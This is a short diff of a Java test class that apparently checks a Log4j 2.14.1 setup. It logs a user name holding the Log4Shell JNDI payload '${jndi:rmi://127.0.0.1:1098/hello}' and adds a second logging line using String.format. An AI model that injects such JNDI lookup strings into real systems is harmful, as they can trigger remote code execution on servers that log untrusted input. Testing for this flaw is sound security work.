@@ -9,5 +9,6 @@ public class Log4JV2141Test {
     public static void main(String[] args) {
         String userName = "${jndi:rmi://127.0.0.1:1098/hello}";
         LOGGER.info("Hello {}!", userName);
+        LOGGER.info(String.format("Hello2 %s",userName));
     }
 }
